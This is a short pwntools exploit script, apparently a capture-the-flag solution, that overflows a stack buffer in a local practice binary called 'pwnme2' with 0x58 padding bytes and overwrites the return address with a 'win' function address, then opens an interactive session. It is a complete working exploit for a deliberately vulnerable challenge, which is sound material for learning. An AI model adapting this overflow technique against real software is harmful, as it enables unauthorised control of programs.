from pwn import *

b = process('./pwnme2')

b.recvuntil(b"Oh baby a triple...\n")

win_addr = 0x000000000040117b

payload  = b'A' * 0x58
payload += p64(win_addr)

b.sendline(payload)
b.interactive()